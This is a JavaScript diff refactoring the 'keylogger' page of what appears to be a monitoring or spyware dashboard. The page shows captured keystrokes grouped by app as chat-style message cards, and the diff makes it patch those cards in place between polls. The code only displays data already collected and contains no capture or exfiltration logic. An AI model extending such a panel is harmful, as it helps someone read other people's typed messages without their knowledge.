@@ -118,7 +118,10 @@ Pages.keylogger = {
     Pages.keylogger._render((q || '').toLowerCase());
   },
 
-  /* ── Render card list ── */
+  /* ── Render card list ──
+     Cards are reused between polls via U.syncList, so an open chat, its scroll
+     position and the entry animations survive every background refresh — only
+     genuinely new messages/cards are added. */
   _render(q) {
     q = q || '';
     var list = document.getElementById('kl-list');
@@ -138,52 +141,92 @@ Pages.keylogger = {
       });
     }
 
-    if (!apps.length) {
-      list.innerHTML = '<div class="empty"><span class="material-symbols-rounded">keyboard_hide</span><p>No key logs ' + (q ? 'match your search' : 'captured yet') + '.</p></div>';
-      return;
+    U.syncList(list, apps,
+      function(appName) { return Pages.keylogger._card(appName); },
+      function(appName, card) { Pages.keylogger._fillCard(card, appName, data[appName] || []); },
+      {
+        empty: '<div class="empty"><span class="material-symbols-rounded">keyboard_hide</span><p>No key logs ' + (q ? 'match your search' : 'captured yet') + '.</p></div>',
+        emptySig: q ? 'search' : 'none'
+      });
+  },
+
+  /* ── Card shell (header markup is static, values are patched) ── */
+  _card(appName) {
+    var iconUrl = Pages.keylogger._appIcon(appName);
+    var card = U.el(
+      '<div class="kl-app-card" data-kl-app="' + U.esc(appName) + '">' +
+        '<div class="kl-app-header">' +
+          '<div class="kl-app-icon-wrap">' +
+            '<img class="kl-app-icon" src="' + iconUrl + '" alt="' + U.esc(appName) + '" onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">' +
+            '<span class="kl-icon-fallback material-symbols-rounded" style="display:none">apps</span>' +
+          '</div>' +
+          '<div class="kl-app-info">' +
+            '<div class="kl-app-name">' + U.esc(appName) + '</div>' +
+            '<div class="kl-app-count" data-kl="count"></div>' +
+            '<div class="kl-app-preview" data-kl="preview"></div>' +
+          '</div>' +
+          '<div class="kl-app-meta">' +
+            '<span class="kl-badge" data-kl="badge">0</span>' +
+            '<span class="material-symbols-rounded kl-chevron" data-kl="chevron">expand_more</span>' +
+          '</div>' +
+        '</div>' +
+      '</div>');
+    card._iconUrl = iconUrl;
+    return card;
+  },
+
+  /* ── Patch one card's header + (when open) its chat list in place ── */
+  _fillCard(card, appName, msgs) {
+    var isOpen = Pages.keylogger._expanded.has(appName);
+    var count = msgs.length;
+    var previewText = count ? Pages.keylogger._cleanText(msgs[0].text).slice(0, 65) : '';
+    if (previewText.length >= 65) previewText += '\u2026';
+
+    card.classList.toggle('open', isOpen);
+
+    var countEl = card.querySelector('[data-kl="count"]');
+    var countText = count + ' message' + (count !== 1 ? 's' : '');
+    if (countEl.textContent !== countText) countEl.textContent = countText;
+
+    var preview = card.querySelector('[data-kl="preview"]');
+    if (preview.textContent !== previewText) preview.textContent = previewText;
+    preview.style.display = previewText ? '' : 'none';
+
+    var badge = card.querySelector('[data-kl="badge"]');
+    if (badge.textContent !== String(count)) badge.textContent = String(count);
+
+    var chevron = card.querySelector('[data-kl="chevron"]');
+    var chevronName = isOpen ? 'expand_less' : 'expand_more';
+    if (chevron.textContent !== chevronName) chevron.textContent = chevronName;
+
+    // The chat area only exists while the card is expanded.
+    var chat = card.querySelector('.kl-chat-area');
+    if (!isOpen) { if (chat) chat.remove(); return; }
+
+    if (!chat) {
+      chat = U.el('<div class="kl-chat-area"><div class="kl-chat-scroll"></div></div>');
+      card.appendChild(chat);
     }
+    var scroll = chat.querySelector('.kl-chat-scroll');
+    if (!scroll) return;
 
-    var html = '';
-    for (var i = 0; i < apps.length; i++) {
-      var appName = apps[i];
-      var msgs = data[appName] || [];
-      var isOpen = Pages.keylogger._expanded.has(appName);
-      var count = msgs.length;
-      var iconUrl = Pages.keylogger._appIcon(appName);
-      var previewText = count ? Pages.keylogger._cleanText(msgs[0].text).slice(0, 65) : '';
-      if (previewText.length >= 65) previewText += '\u2026';
+    var byKey = {};
+    msgs.forEach(function(m) { byKey[m.key] = m; });
+    var iconUrl = card._iconUrl || Pages.keylogger._appIcon(appName);
 
-      html += '<div class="kl-app-card' + (isOpen ? ' open' : '') + '" data-kl-app="' + U.esc(appName) + '">';
-      html +=   '<div class="kl-app-header">';
-      html +=     '<div class="kl-app-icon-wrap">';
-      html +=       '<img class="kl-app-icon" src="' + iconUrl + '" alt="' + U.esc(appName) + '" onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">';
-      html +=       '<span class="kl-icon-fallback material-symbols-rounded" style="display:none">apps</span>';
-      html +=     '</div>';
-      html +=     '<div class="kl-app-info">';
-      html +=       '<div class="kl-app-name">' + U.esc(appName) + '</div>';
-      html +=       '<div class="kl-app-count">' + count + ' message' + (count !== 1 ? 's' : '') + '</div>';
-      if (previewText) {
-        html +=     '<div class="kl-app-preview">' + U.esc(previewText) + '</div>';
-      }
-      html +=     '</div>';
-      html +=     '<div class="kl-app-meta">';
-      html +=       '<span class="kl-badge">' + count + '</span>';
-      html +=       '<span class="material-symbols-rounded kl-chevron">' + (isOpen ? 'expand_less' : 'expand_more') + '</span>';
-      html +=     '</div>';
-      html +=   '</div>';
-
-      if (isOpen) {
-        html += '<div class="kl-chat-area"><div class="kl-chat-scroll">';
-        for (var j = 0; j < msgs.length; j++) {
-          html += Pages.keylogger._bubble(msgs[j], appName, iconUrl);
-        }
-        html += '</div></div>';
-      }
-
-      html += '</div>';
-    }
-
-    list.innerHTML = html;
+    U.syncList(scroll, msgs.map(function(m) { return m.key; }),
+      function(key) {
+        var node = U.el(Pages.keylogger._bubble(byKey[key], appName, iconUrl));
+        node.setAttribute('data-sig', byKey[key].text);
+        return node;
+      },
+      function(key, node) {
+        var m = byKey[key];
+        if (!m || node.getAttribute('data-sig') === m.text) return;
+        node.setAttribute('data-sig', m.text);
+        var clean = Pages.keylogger._cleanText(m.text);
+        node.querySelector('.kl-bubble-text').innerHTML = clean ? U.esc(clean) : '<em style="opacity:0.35">empty</em>';
+      });
   },
 
   /* ── Toggle expand/collapse ── */
